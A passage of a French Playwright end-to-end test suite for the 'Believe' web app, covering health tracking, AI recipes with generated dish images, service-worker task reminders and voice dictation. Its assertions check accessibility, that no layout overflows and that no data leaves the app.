  await seedSuivi({ mode: 'cycle', starts: [-12], en: [[0, 4]] }, { discret: false }); await sante('#/8/suivi')
  // effacement avec confirmation ; le type de suivi est conservé
  await pg.getByRole('button', { name: 'Effacer mes notes et dates' }).click(); await pg.getByRole('button', { name: 'Annuler' }).click(); eq((await store(pg)).cycle.starts.length, 1)
  await pg.getByRole('button', { name: 'Effacer mes notes et dates' }).click(); await pg.getByRole('button', { name: 'Oui, tout effacer' }).click(); await pg.getByText('Notes et dates effacées. Le type de suivi est conservé.').waitFor()
  const c = (await store(pg)).cycle; eq([c.mode, c.starts, c.en, c.rec], ['cycle', [], {}, {}])
  eq(reqG.filter(u => !u.startsWith(URL0)), [], 'requêtes hors de l’application'); eq(reqG.filter(u => /\/api\//.test(u)), [], 'appel à une fonction serveur')
})

await T('Suivi de la récupération (Chromium réel) : trois notes requises, jour au choix, conseil de repos après trois jours bas, rappel dans Sport, accessibilité sur trois thèmes, aucun débordement', async () => {
  await seedSuivi({ mode: 'recup' }); await sante('#/8/suivi')
  eq(await pg.getByLabel('Premier jour des règles').count(), 0, 'champ du cycle en mode récupération'); yes(await flat(pg), 'débordement (récupération vide)'); await themed(pg, 'suivi-récupération-vide')
  await pg.getByRole('button', { name: 'Enregistrer la journée' }).click(); await pg.getByRole('alert').filter({ hasText: 'Il manque une note de 1 à 5 : récupération nerveuse, force, vitalité.' }).waitFor()
  await pg.getByLabel('Jour noté').selectOption({ index: 1 }); await rateG('Récupération nerveuse', 4); await rateG('Force', 3); await rateG('Vitalité', 5); await pg.getByRole('button', { name: 'Enregistrer la journée' }).click(); await pg.getByText('Journée enregistrée : hier.').waitFor()
  eq((await store(pg)).cycle.rec[await dayIn(pg, -1)], [4, 3, 5], 'note enregistrée sur le mauvais jour')
  // trois jours de suite à 2 ou moins : conseil prudent, sans diagnostic
  await seedSuivi({ mode: 'recup', rec: [[0, [2, 3, 3]], [-1, [1, 3, 3]], [-2, [2, 4, 4]], [-3, [4, 4, 4]], [-4, [3, 3, 3]]] }); await sante('#/8/suivi')
  await pg.getByRole('heading', { name: 'Récupération basse' }).waitFor(); yes(/Believe ne pose aucun diagnostic/.test(await pg.getByRole('status').filter({ hasText: 'Récupération basse' }).textContent()), 'mention sans diagnostic')
  await pg.getByText(/Moyenne sur 7 jours \(5 jours notés\)/).waitFor(); eq(await pg.getByRole('img', { name: /Récupération nerveuse des 14 derniers jours : 5 jours notés/ }).count(), 1)
  yes(await flat(pg), 'débordement (récupération basse)'); await wait(250); await shot(pg, 'suivi-recuperation'); await themed(pg, 'suivi-récupération')
  await pg.setViewportSize({ width: 320, height: 640 }); await wait(300); yes(await flat(pg), 'débordement (récupération, 320 px)'); await pg.setViewportSize({ width: 390, height: 844 }); await wait(300)
  await sport('#/7/programmes'); const note = pg.getByRole('note'); await note.waitFor(); yes(/suggestion, jamais une consigne/.test(await note.textContent()), 'rappel de repos dans Sport'); await note.getByRole('link', { name: 'Voir le suivi' }).click()
  await pg.waitForSelector('h1:has-text("Santé, scanner et recettes")'); eq(await pg.evaluate(() => location.hash), '#/8/suivi')
  await sport('#/7/programmes'); yes(await flat(pg), 'débordement (Sport avec rappel)'); await themed(pg, 'sport-rappel-récupération')
  // suivi du cycle : aucun rappel dans Sport
  await seedSuivi({ mode: 'cycle', starts: [-5], rec: [[0, [1, 1, 1]], [-1, [1, 1, 1]], [-2, [1, 1, 1]]] }); await sport('#/7/programmes'); eq(await pg.getByRole('note').count(), 0, 'rappel affiché hors suivi de récupération')
  eq(reqG.filter(u => !u.startsWith(URL0)), [], 'requêtes hors de l’application')
})

// ---------------------------------------------------------------- rubrique 8 : recettes et image du plat (réponses des fonctions serveur simulées par interception réseau)
const RECIPES = [
  { titre: 'Omelette aux courgettes', minutes: 15, kcal: 320, proteines: 20, glucides: 8, lipides: 22, ingredients: ['œufs', 'courgettes', 'feta'], etapes: ['Couper les courgettes.', 'Cuire doucement avec les œufs battus.'] },
  { titre: 'Salade de pois chiches', minutes: 10, kcal: 280, proteines: 14, glucides: 30, lipides: 11, ingredients: ['pois chiches', 'concombre', 'citron'], etapes: ['Égoutter les pois chiches.', 'Mélanger avec le concombre et le citron.'] },
  { titre: 'Soupe de potimarron', minutes: 30, kcal: 210, proteines: 6, glucides: 24, lipides: 9, ingredients: ['potimarron', 'oignon', 'bouillon'], etapes: ['Cuire le potimarron.', 'Mixer avec le bouillon.'] }
]
await T('Recettes et image du plat (Chromium réel) : rien d’envoyé sans clic, vraie image décodée sous la CSP, mention « Généré par IA », blocage, retrait, nouvelle recherche, accessibilité sur trois thèmes, aucun débordement', async () => {
  const png = await pg.evaluate(() => { const c = document.createElement('canvas'); c.width = 640; c.height = 480; const x = c.getContext('2d'), g = x.createLinearGradient(0, 0, 640, 480); g.addColorStop(0, '#d9a441'); g.addColorStop(1, '#7a3b1e'); x.fillStyle = g; x.fillRect(0, 0, 640, 480); return c.toDataURL('image/png').split(',')[1] })
  const asks = [], imgs = []
  const answer = (r, status, body) => r.fulfill({ status, contentType: 'application/json', body: JSON.stringify(body) }).catch(() => undefined) // requête déjà abandonnée par la page : rien à répondre
  await pg.route('**/api/ai', r => { asks.push(JSON.parse(r.request().postData())); answer(r, 200, { data: RECIPES, model: 'gemini-test' }) })
  await pg.route('**/api/img', async r => {
    const b = JSON.parse(r.request().postData()); imgs.push(b); await wait(350)
    if (b.title === 'Salade de pois chiches') return answer(r, 422, { error: 'blocked' })
    answer(r, 200, { image: png, mime: 'image/png', model: 'gemini-nano-banana-2.1' })
  })
  try {
    await pg.evaluate(() => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.consents.health = true; s.consents.ai = true; localStorage.setItem('believe:v2', JSON.stringify(s)) })
    await sante('#/8/recettes')
    await pg.getByLabel('Ingrédients', { exact: true }).fill('courgettes, œufs, feta'); await pg.getByRole('button', { name: 'Proposer 3 recettes' }).click(); await pg.getByRole('heading', { name: 'Omelette aux courgettes' }).waitFor()
    eq([asks.length, asks[0].mode, asks[0].image ?? null], [1, 'recipes', null]); eq(imgs.length, 0, 'image demandée sans clic'); eq(await pg.getByRole('button', { name: 'Générer l’image du plat' }).count(), 3)
    yes(await flat(pg), 'débordement (recettes sans image)'); await wait(250); await shot(pg, 'recettes-sans-image')
    const card = t => pg.locator('div.card:has(> h2)').filter({ hasText: t })
    // 1) image réussie : en cours, puis vraie image décodée (la CSP d'« img-src data: » est réellement appliquée)
    const c1 = card('Omelette aux courgettes'); await c1.getByRole('button', { name: 'Générer l’image du plat' }).click(); await c1.getByRole('button', { name: 'Annuler l’image' }).waitFor(); await c1.getByText(/jusqu’à une minute/).waitFor()
    await c1.getByRole('img', { name: 'Illustration du plat générée par IA : Omelette aux courgettes' }).waitFor(); await c1.getByText(/Généré par IA : illustration \(Google Gemini, filigrane invisible SynthID\)/).waitFor()
    const info = await c1.locator('img').evaluate(i => ({ w: i.naturalWidth, h: i.naturalHeight, done: i.complete, box: i.getBoundingClientRect().toJSON(), cw: document.documentElement.clientWidth, src: i.src.slice(0, 22) }))
    eq([info.w, info.h, info.done, info.src], [640, 480, true, 'data:image/png;base64,'], 'image non décodée'); yes(Math.abs(info.box.width / info.box.height - 4 / 3) < 0.02, 'rapport 4:3 : ' + JSON.stringify(info.box)); yes(info.box.width <= info.cw - 16, 'image plus large que l’écran')
    eq(await pg.evaluate(() => document.querySelector('.dish img').parentElement.nextElementSibling.tagName), 'H2', 'l’image doit précéder le titre')
    // 2) image bloquée par les filtres : message dédié, nouvelle tentative proposée, rien d'affiché
    const c2 = card('Salade de pois chiches'); await c2.getByRole('button', { name: 'Générer l’image du plat' }).click()
    await c2.getByRole('alert').filter({ hasText: 'Le service IA n’a pas pu créer cette image (filtres de sécurité). Essayez avec une autre recette.' }).waitFor(); await c2.getByRole('button', { name: 'Réessayer l’image' }).waitFor(); eq(await c2.locator('img').count(), 0)
    // 3) troisième image et affichage simultané
    const c3 = card('Soupe de potimarron'); await c3.getByRole('button', { name: 'Générer l’image du plat' }).click(); await c3.getByRole('img', { name: /Soupe de potimarron/ }).waitFor()
    eq(imgs.map(b => Object.keys(b).sort().join()), ['ingredients,title', 'ingredients,title', 'ingredients,title'], 'le corps ne doit contenir que le titre et les ingrédients'); eq(imgs[0], { title: 'Omelette aux courgettes', ingredients: ['œufs', 'courgettes', 'feta'] })
    yes(await flat(pg), 'débordement (recettes avec images, 390 px)'); await wait(250); await shot(pg, 'recettes-avec-images'); await themed(pg, 'recettes-images-et-erreur')
    await pg.setViewportSize({ width: 320, height: 640 }); await wait(300); yes(await flat(pg), 'débordement (recettes avec images, 320 px)'); await pg.setViewportSize({ width: 390, height: 844 }); await wait(300)
    await pg.evaluate(() => document.documentElement.setAttribute('data-theme', 'dark')); await wait(250); await shot(pg, 'recettes-avec-images-sombre'); await pg.evaluate(() => document.documentElement.removeAttribute('data-theme'))
    // rien n'est enregistré : ni l'image, ni un repas
    const raw = await pg.evaluate(() => localStorage.getItem('believe:v2')); yes(!raw.includes(png.slice(0, 40)) && !raw.includes('data:image'), 'image enregistrée dans le stockage local'); eq((await store(pg)).meals, [])
    // retrait d'une image, puis nouvelle recherche : les images disparaissent
    await c1.getByRole('button', { name: 'Retirer l’image' }).click(); eq(await c1.locator('img').count(), 0); await c1.getByRole('button', { name: 'Générer l’image du plat' }).waitFor()
    await pg.getByRole('button', { name: 'Proposer 3 recettes' }).click(); await pg.getByRole('heading', { name: 'Omelette aux courgettes' }).waitFor(); await wait(300); eq(await pg.locator('.dish').count(), 0, 'images conservées après une nouvelle recherche'); eq(asks.length, 2)
    // les requêtes : uniquement l'application et ses deux fonctions serveur
    eq(reqG.filter(u => !u.startsWith(URL0)), [], 'requêtes hors de l’application'); eq(reqG.filter(u => /\/api\//.test(u)).map(u => u.replace(URL0, '')).sort(), ['api/ai', 'api/ai', 'api/img', 'api/img', 'api/img'])
  } finally { await pg.unroute('**/api/ai'); await pg.unroute('**/api/img') }
})

// ---------------------------------------------------------------- rubrique 9 : rappels de tâches (vrai service worker, notifications autorisées, horloge simulée)
const J = await mk({ permissions: ['notifications'] }), pj = J.page, reqJ = []
pj.on('request', r => { if (!/^data:|^blob:/.test(r.url())) reqJ.push(r.url()) })
await J.ctx.addInitScript(() => { // journal des notifications du système demandées au service worker : ce que Believe demande (titre et options) et ce que le navigateur répond (promesse tenue ou refusée)
  window.__shown = []
  const P = window.ServiceWorkerRegistration?.prototype
  if (P) {
    const f = P.showNotification
    P.showNotification = function (t, o) {
      const rec = { title: t, body: o && o.body, tag: o && o.tag, data: o && o.data, icon: o && o.icon, badge: o && o.badge, lang: o && o.lang, state: 'en cours' }
      window.__shown.push(rec); const p = f.call(this, t, o); p.then(() => { rec.state = 'ok' }, e => { rec.state = 'refus : ' + e }); return p
    }
  }
})
const inMin = (p, min) => p.evaluate(min => { const d = new Date(Date.now() + min * 60e3), z = n => String(n).padStart(2, '0'); return { due: d.getFullYear() + '-' + z(d.getMonth() + 1) + '-' + z(d.getDate()) + 'T' + z(d.getHours()) + ':' + z(d.getMinutes()), hm: z(d.getHours()) + ':' + z(d.getMinutes()) } }, min)
const taskOf = (id, t, due) => ({ id, t, imp: false, done: false, due, p: null })
const setState = async (p, fn, arg) => { // l'état est écrit hors de l'application (qui sinon réécrirait son état en mémoire en se fermant), puis l'application est chargée une seule fois : un rappel n'est montré qu'une fois
  await p.goto(URL0 + 'manifest.webmanifest'); await p.evaluate(`((${fn.toString()})(${JSON.stringify(arg ?? null)}))`)
  await p.goto(URL0 + '#/9'); await p.waitForSelector('h1:has-text("Professionnel et calendrier")'); await wait(400)
}
const sysNotifs = p => p.evaluate(async () => { const r = await navigator.serviceWorker.getRegistration(); return (await r.getNotifications()).map(n => ({ title: n.title, body: n.body, tag: n.tag, data: n.data, icon: n.icon, lang: n.lang })) })
const clearNotifs = p => p.evaluate(async () => { const r = await navigator.serviceWorker.getRegistration(); for (const n of await r.getNotifications()) n.close(); for (let i = 0; i < 40 && (await r.getNotifications()).length; i++) await new Promise(f => setTimeout(f, 50)) })
const dumpRem = async p => JSON.stringify({ journal: await p.evaluate(() => window.__shown), taches: (await store(p)).tasks.map(x => [x.id, x.due, x.r ?? null]), discret: (await store(p)).discret, maintenant: await p.evaluate(() => new Date().toString()), visibilite: await p.evaluate(() => document.visibilityState), autorisation: await p.evaluate(() => Notification.permission), controle: await p.evaluate(() => !!navigator.serviceWorker.controller), sw: await p.evaluate(async () => { const r = await navigator.serviceWorker.getRegistration(); return r ? [r.scope, r.active && r.active.state, !!r.waiting, !!r.installing] : null }), liste: await sysNotifs(p) })
const shownOf = (p, tag) => p.evaluate(tag => window.__shown.filter(x => x.tag === tag), tag)
/** Attend que le navigateur ait répondu à la demande d'affichage (promesse tenue) pour cette étiquette, et renvoie ce que Believe a demandé. */
const waitShown = async (p, tag) => { for (let i = 0; i < 80; i++) { const r = (await shownOf(p, tag)).filter(x => x.state !== 'en cours'); if (r.length) return r; await wait(100) } throw new Error('notification « ' + tag + ' » jamais demandée ou jamais acceptée ' + await dumpRem(p)) }
/** Notification réellement listée par le navigateur (contrôle complémentaire : Chromium sans écran ne la garde pas toujours dans sa liste alors qu'il a accepté la demande), ou null. */
const listed = async (p, tag, ms = 3000) => { for (let i = 0; i < ms / 100; i++) { const n = (await sysNotifs(p)).find(x => x.tag === tag); if (n) return n; await wait(100) } return null }
/** Vérifie une demande d'affichage (titre, corps, étiquette, adresse du clic, langue, icône) : exacte dans le journal ; identique dans la liste du navigateur quand elle y figure. */
const askedOk = async (p, tag, title, body) => {
  const r = await waitShown(p, tag); eq(r.length, 1, 'demandes d’affichage pour ' + tag + ' : ' + JSON.stringify(r)); const x = r[0]
  eq([x.state, x.title, x.tag, x.data, x.lang], ['ok', title, tag, { url: '/#/9' }, 'fr'], 'demande ' + tag); yes((typeof body === 'string' ? x.body === body : body.test(x.body)), 'corps de ' + tag + ' : ' + x.body); yes(x.icon.endsWith('/icon-192.png') && x.badge.endsWith('/icon-192.png'), 'icônes de ' + tag + ' : ' + x.icon + ' ' + x.badge)
  const n = await listed(p, tag); if (n) eq([n.title, n.body, n.tag, n.data, n.lang], [x.title, x.body, x.tag, x.data, x.lang], 'liste du navigateur pour ' + tag); else console.log('  (note) le Chromium sans écran n’a pas listé la notification « ' + tag + ' » après l’avoir acceptée')
  return x
}
const asHidden = (p, hidden) => p.evaluate(h => { Object.defineProperty(document, 'visibilityState', { configurable: true, get: () => (h ? 'hidden' : 'visible') }); Object.defineProperty(document, 'hidden', { configurable: true, get: () => h }); document.dispatchEvent(new Event('visibilitychange')) }, hidden)
const BAN = '[role=status]:has(.ban.rem)'
const pro = async () => { await pj.goto(URL0 + '#/9'); await pj.reload(); await pj.waitForSelector('h1:has-text("Professionnel et calendrier")'); await wait(400) }
await T('Rappels de tâches (Chromium réel, vrai service worker) : activation, bannière au premier plan, notification du système en arrière-plan (texte neutre en mode discret), une fois par échéance, aucune requête réseau, accessibilité sur trois thèmes', async () => {
  await J.ctx.clock.install({ time: new Date() })
  await pj.goto(URL0 + '#/9'); await pj.waitForSelector('h1'); await pj.evaluate(ONBOARDED); await pj.evaluate(() => navigator.serviceWorker.ready); await wait(500)
  // le service worker généré charge bien le script du clic sur la notification
  const swText = await pj.evaluate(async () => ({ sw: await (await fetch('/sw.js')).text(), nf: await fetch('/sw-notify.js').then(async r => ({ ok: r.ok, type: r.headers.get('content-type'), text: await r.text() })) }))
  yes(/importScripts\("sw-notify\.js"\)/.test(swText.sw), 'sw.js n’importe pas sw-notify.js'); yes(swText.nf.ok && /javascript/.test(swText.nf.type) && /notificationclick/.test(swText.nf.text), 'sw-notify.js introuvable ou mal servi : ' + JSON.stringify([swText.nf.ok, swText.nf.type]))
  // 1) activation depuis la carte « Rappels » : l'accord est demandé au clic, le navigateur a déjà autorisé les notifications
  await pro()
  eq(await pj.evaluate(() => Notification.permission), 'granted'); eq((await store(pj)).consents.notif, false, 'accord donné d’avance')
  await pj.getByRole('button', { name: 'Activer les rappels' }).click(); await pj.getByText('Rappels activés. Les notifications du système sont autorisées.').waitFor()
  eq([(await store(pj)).consents.notif, (await store(pj)).settings.remind], [true, 30]); await pj.getByText('Notifications du système : autorisées.').waitFor()
  eq(await pj.getByLabel('Prévenir', { exact: true }).evaluate(s => [s.value, [...s.options].map(o => o.textContent)]), ['30', ['À l’heure de l’échéance', '10 minutes avant', '30 minutes avant', '1 heure avant', '2 heures avant']])
  await pj.getByRole('button', { name: 'Tester une notification' }).click(); await pj.getByText(/Notification de test envoyée/).waitFor()
  await askedOk(pj, 'test', 'Believe : test', 'Les rappels de tâches fonctionnent.'); await clearNotifs(pj)
  yes(await flat(pj), 'débordement (carte Rappels)'); await shot(pj, 'rappels-carte'); await themed(pj, 'rappels-carte')
  // 2) premier plan : une tâche dans son délai de rappel → bannière dans l'application, rien dans le système, marque enregistrée
  const a = await inMin(pj, 20)
  await setState(pj, d => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.tasks = [{ id: 'ta', t: 'Appeler Paul', imp: false, done: false, due: d.due, p: null }]; localStorage.setItem('believe:v2', JSON.stringify(s)) }, a)
  const ban = pj.locator(BAN); await ban.getByText('Rappel de tâche', { exact: true }).waitFor()
  const line = await ban.locator('li').allTextContents(); eq(line.length, 1, 'lignes du bandeau ' + JSON.stringify(line)); yes(new RegExp('^Appeler Paul : échéance (aujourd’hui|demain) à ' + a.hm + '$').test(line[0]), 'ligne du rappel : ' + line[0])
  eq(await ban.getByRole('link', { name: 'Ouvrir les tâches' }).getAttribute('href'), '#/9')
  eq((await store(pj)).tasks[0].r, a.due, 'rappel non marqué'); eq(await sysNotifs(pj), [], 'notification du système au premier plan'); eq(await pj.evaluate(() => window.__shown), [], 'notification du système demandée au premier plan')
  yes(await flat(pj), 'débordement (bannière, 390 px)'); await shot(pj, 'rappels-bandeau')
  await pj.setViewportSize({ width: 320, height: 640 }); await wait(300); yes(await flat(pj), 'débordement (bannière, 320 px)'); await pj.setViewportSize({ width: 390, height: 844 }); await wait(300)
  await themed(pj, 'rappels-bandeau'); await pj.evaluate(() => document.documentElement.setAttribute('data-theme', 'dark')); await wait(250); await shot(pj, 'rappels-bandeau-sombre'); await pj.evaluate(() => document.documentElement.removeAttribute('data-theme'))
  await ban.getByRole('button', { name: 'Fermer les rappels' }).click(); eq(await pj.locator('.ban.rem').count(), 0, 'bandeau non fermé')
  await pj.reload(); await pj.waitForSelector('h1:has-text("Professionnel et calendrier")'); await wait(400); eq(await pj.locator('.ban.rem').count(), 0, 'le rappel revient après réouverture')
  // 3) arrière-plan : une tâche pas encore dans son délai ; 21 minutes passent (horloge avancée d'un coup, comme un téléphone qui se réveille) → notification du système, une seule
  const b = await inMin(pj, 50)
  await setState(pj, d => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.tasks = [{ id: 'tb', t: 'Préparer la réunion', imp: false, done: false, due: d.due, p: null }]; localStorage.setItem('believe:v2', JSON.stringify(s)) }, b)
  eq(await pj.locator('.ban.rem').count(), 0, 'rappel avant le délai'); eq((await store(pj)).tasks[0].r ?? null, null)
  await asHidden(pj, true); await J.ctx.clock.fastForward('21:00')
  await askedOk(pj, 'tb', 'Préparer la réunion', new RegExp('^Échéance (aujourd’hui|demain) à ' + b.hm + '$'))
  await pj.waitForFunction(() => JSON.parse(localStorage.getItem('believe:v2')).tasks[0].r !== undefined); eq((await store(pj)).tasks[0].r, b.due)
  await J.ctx.clock.fastForward('02:00'); await wait(300); eq((await shownOf(pj, 'tb')).length, 1, 'notification redemandée')
  await asHidden(pj, false); await closeVerse(pj); eq(await pj.locator('.ban.rem').count(), 0, 'bannière pour un rappel déjà donné par le système'); await clearNotifs(pj)
  // 4) mode discret : ni le titre ni l'heure dans la notification du système
  const c = await inMin(pj, 50)
  await setState(pj, d => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.discret = true; s.tasks = [{ id: 'tc', t: 'Rendez-vous médecin', imp: false, done: false, due: d.due, p: null }]; localStorage.setItem('believe:v2', JSON.stringify(s)) }, c)
  await closeVerse(pj); await asHidden(pj, true); await J.ctx.clock.fastForward('21:00')
  const nc = await askedOk(pj, 'tc', 'Believe : rappel', 'Une tâche arrive à échéance.')
  yes(!JSON.stringify(await pj.evaluate(() => window.__shown)).includes('médecin') && !JSON.stringify(nc).includes(c.hm), 'le titre ou l’heure fuit dans la notification masquée'); await clearNotifs(pj)
  // 5) rien d'envoyé : uniquement l'application, aucune fonction serveur
  eq(reqJ.filter(u => !u.startsWith(URL0)), [], 'requêtes hors de l’application'); eq(reqJ.filter(u => /\/api\//.test(u)), [], 'fonction serveur appelée')
  eq(J.errors.filter(e => !/favicon|Failed to load resource/.test(e)), [], 'erreurs de console')
})

// ---------------------------------------------------------------- rubrique 3 : dictée vocale du chat Believe AI (moteur de reconnaissance simulé pour piloter les événements, puis vrai moteur de Chromium)
const K = await mk({ serviceWorkers: 'block' }), pk = K.page, reqK = []
pk.on('request', r => { if (!/^data:|^blob:/.test(r.url())) reqK.push(r.url()) })
await K.ctx.addInitScript(() => { // faux moteur : le test envoie les événements (début, résultat, erreur, fin) ; la page, le champ, la CSP et le clavier restent ceux d'un vrai navigateur
  window.__recs = []
  class Fake {
    constructor() { this.lang = ''; this.continuous = true; this.interimResults = false; this.maxAlternatives = 0; this.onstart = this.onresult = this.onerror = this.onend = null; this.calls = []; window.__recs.push(this) }
    start() { this.calls.push('start') } stop() { this.calls.push('stop') } abort() { this.calls.push('abort') }
  }
  window.SpeechRecognition = window.webkitSpeechRecognition = Fake // Chromium récent expose aussi le nom standard : les deux sont remplacés
  window.__say = (i, parts, from = 0) => { const r = window.__recs[i]; if (r.onresult) r.onresult({ resultIndex: from, results: parts.map(([t, f]) => ({ isFinal: f, length: 1, 0: { transcript: t } })) }) }
  window.__ev = (i, name, arg) => { const h = window.__recs[i]['on' + name]; if (h) h(arg) }
})
const aiState = (p, speech) => viaStatic(p, s => { const st = JSON.parse(localStorage.getItem('believe:v2')); st.consents.ai = true; st.consents.speech = s; st.ui = { onboard: true, verseDay: (() => { const d = new Date(); return d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0') })() }; localStorage.setItem('believe:v2', JSON.stringify(st)) }, speech)
const aiOpen = async p => { await p.goto(URL0 + '#/3'); await p.waitForSelector('h1:has-text("Believe AI")'); await wait(300) }
const recCalls = (p, i) => p.evaluate(i => window.__recs[i]?.calls ?? null, i)
const status = p => p.locator('[role=status]').allTextContents()
/** Le texte dicté arrive par un événement hors de React : l'affichage suit au tour suivant, on attend donc la valeur au lieu de la lire une fois. */
const fieldIs = async (f, want, m = 'champ de la question') => { let v; for (let i = 0; i < 60; i++) { v = await f.inputValue(); if (v === want) return; await wait(50) } eq(v, want, m) }
await T('Dictée vocale du chat Believe AI (Chromium réel, moteur de reconnaissance simulé) : explication avant tout, accord, écoute, texte ajouté sans rien envoyer, envoi par le bouton seulement, micro relâché, accessibilité sur trois thèmes', async () => {
  await pk.goto(URL0 + '#/3'); await pk.waitForSelector('h1'); await aiState(pk, false); await aiOpen(pk)
  const field = pk.getByLabel('Votre question', { exact: true }), dicter = pk.getByRole('button', { name: 'Dicter', exact: true })
  eq(await pk.evaluate(() => window.__recs.length), 0)
  // 1) sans accord : l'explication d'abord, aucune écoute ; refus possible
  await dicter.click(); const card = pk.getByRole('group', { name: 'Dictée vocale' }); await card.waitFor()
  yes(/Google ou à Apple/.test(await card.textContent()) && /ne garde aucun enregistrement/.test(await card.textContent()), 'explication incomplète')
  eq(await pk.evaluate(() => window.__recs.length), 0, 'écoute lancée avant l’accord'); eq(await pk.evaluate(() => document.activeElement?.id), 'sp-h', 'le focus doit aller sur le titre de la carte d’accord'); yes(await flat(pk), 'débordement (accord, 390 px)'); await shot(pk, 'dictee-accord'); await themed(pk, 'dictee-accord')
  await pk.setViewportSize({ width: 320, height: 640 }); await wait(300); yes(await flat(pk), 'débordement (accord, 320 px)'); await pk.setViewportSize({ width: 390, height: 844 }); await wait(300)
  await card.getByRole('button', { name: 'Plus tard' }).click(); eq(await card.count(), 0); eq((await store(pk)).consents.speech, false)
  eq(await pk.evaluate(() => document.activeElement?.textContent), 'Dicter', 'le focus doit revenir sur « Dicter » quand la carte se ferme')
  // 2) accord : l'écoute démarre dans le même geste (c'est ce qui permet au navigateur de demander le micro) ; français, une phrase, provisoire
  await dicter.click(); await card.getByRole('button', { name: 'J’accepte et je dicte' }).click()
  await pk.getByRole('button', { name: 'Arrêter la dictée' }).waitFor(); eq((await store(pk)).consents.speech, true)
  eq(await pk.evaluate(() => document.activeElement?.textContent), 'Arrêter la dictée', 'le focus doit rester sur le bouton de dictée après l’accord'); eq(await pk.getByRole('button', { name: 'Arrêter la dictée' }).getAttribute('aria-pressed'), null)
  eq(await pk.evaluate(() => { const r = window.__recs[0]; return [window.__recs.length, r.lang, r.continuous, r.interimResults, r.calls] }), [1, 'fr-FR', false, true, ['start']])
  yes((await status(pk)).includes('Préparation du micro…'), 'état « préparation » non annoncé : ' + JSON.stringify(await status(pk)))
  await pk.evaluate(() => window.__ev(0, 'start')); await pk.getByText('Dictée en cours : parlez, puis faites une pause.').waitFor()
  await pk.evaluate(() => window.__say(0, [['bonjour je cherche', false]])); await pk.getByText('bonjour je cherche', { exact: true }).waitFor(); await fieldIs(field, '')
  yes(await flat(pk), 'débordement (écoute, 390 px)'); await shot(pk, 'dictee-ecoute'); await themed(pk, 'dictee-ecoute')
  await pk.evaluate(() => window.__say(0, [['bonjour je cherche un plan pour dimanche', true]])); await fieldIs(field, 'Bonjour je cherche un plan pour dimanche')
  await pk.evaluate(() => window.__ev(0, 'end')); await dicter.waitFor(); yes((await status(pk)).includes('Texte dicté ajouté à votre question.'), 'ajout non annoncé')
  eq(reqK.filter(u => /\/api\//.test(u)), [], 'requête envoyée avant le bouton « Envoyer »')
  // 3) au clavier : Entrée sur « Dicter » lance l'écoute (une seconde phrase complète le champ)
  await dicter.focus(); await pk.keyboard.press('Enter'); await pk.getByRole('button', { name: 'Arrêter la dictée' }).waitFor(); eq(await recCalls(pk, 1), ['start'])
  await pk.evaluate(() => { window.__ev(1, 'start'); window.__say(1, [['et un goûter', true]]) }); await fieldIs(field, 'Bonjour je cherche un plan pour dimanche et un goûter')
  // 4) envoi : seulement par le bouton ; l'écoute en cours est coupée ; le texte envoyé est celui du champ
  const asks = []; await pk.route('**/api/ai', r => { asks.push(JSON.parse(r.request().postData())); r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ text: 'Voici un plan simple pour dimanche.', model: 'gemini-test' }) }).catch(() => undefined) })
  try {
    await pk.getByRole('button', { name: 'Envoyer', exact: true }).click(); await pk.getByText('Voici un plan simple pour dimanche.').waitFor()
    eq(asks.map(a => [a.mode, a.messages]), [['nutrition', [{ role: 'user', content: 'Bonjour je cherche un plan pour dimanche et un goûter' }]]]); eq(await recCalls(pk, 1), ['start', 'abort'], 'écoute non coupée à l’envoi')
    eq(await field.inputValue(), ''); await dicter.waitFor()
  } finally { await pk.unroute('**/api/ai') }
  // 5) une erreur du moteur : message annoncé, retour à « Dicter » ; le micro n'est pas ouvert par Believe lui-même
  await dicter.click(); await pk.evaluate(() => { window.__ev(2, 'start'); window.__ev(2, 'error', { error: 'not-allowed' }); window.__ev(2, 'end') })
  await pk.getByRole('alert').filter({ hasText: 'Le micro est refusé pour ce site.' }).waitFor(); await dicter.waitFor(); await themed(pk, 'dictee-erreur')
  eq(await pk.evaluate(() => window.__streams.length), 0, 'Believe a ouvert son propre flux micro pour la dictée')
  // 6) page masquée, puis page quittée : le micro est relâché
  await dicter.click(); eq(await recCalls(pk, 3), ['start']); await pk.evaluate(() => { Object.defineProperty(document, 'hidden', { configurable: true, get: () => true }); document.dispatchEvent(new Event('visibilitychange')) })
  eq(await recCalls(pk, 3), ['start', 'abort'], 'écoute gardée page masquée'); await dicter.waitFor(); await pk.evaluate(() => { delete document.hidden })
  await dicter.click(); eq(await recCalls(pk, 4), ['start']); await pk.evaluate(() => { location.hash = '#/4' }); await pk.waitForSelector('h1:has-text("Accueil")').catch(() => undefined); await wait(300)
  eq(await recCalls(pk, 4), ['start', 'abort'], 'écoute gardée après avoir quitté la page')
  // 7) rien d'autre n'est parti : uniquement l'application et un seul appel à la fonction serveur (celui de « Envoyer »)
  eq(reqK.filter(u => !u.startsWith(URL0)), [], 'requêtes hors de l’application'); eq(reqK.filter(u => /\/api\//.test(u)).length, 1)
  eq(K.errors.filter(e => !/favicon|Failed to load resource/.test(e)), [], 'erreurs de console')
})

const N = await mk({ serviceWorkers: 'block' }), pn = N.page
await T('Dictée vocale (Chromium réel, vrai moteur de reconnaissance) : le moteur échoue ou se termine sans figer l’interface, message clair ou retour à « Dicter », aucune erreur dans la console', async () => {
  await pn.goto(URL0 + '#/3'); await pn.waitForSelector('h1'); await aiState(pn, true); await aiOpen(pn)
  const has = await pn.evaluate(() => !!(window.SpeechRecognition || window.webkitSpeechRecognition))
  if (!has) { await pn.getByText(/La dictée vocale n’est pas disponible dans ce navigateur/).waitFor(); console.log('  (note) ce Chromium n’a pas de moteur de reconnaissance vocale : seul le message d’indisponibilité a été vérifié'); return }
  const dicter = pn.getByRole('button', { name: 'Dicter', exact: true }), t0 = Date.now(); await dicter.click()
  const idleWithin = async ms => { for (let i = 0; i < ms / 100; i++) { if ((await dicter.count()) && Date.now() - t0 > 500) return true; await wait(100) } return false }
  let stopped = false
  if (!(await idleWithin(12000))) { stopped = true; await pn.getByRole('button', { name: 'Arrêter la dictée' }).click(); eq(await idleWithin(6000), true, 'l’interface reste en écoute 6 s après « Arrêter la dictée »') }
  const alertTxt = (await pn.getByRole('alert').allTextContents()).join(' | ')
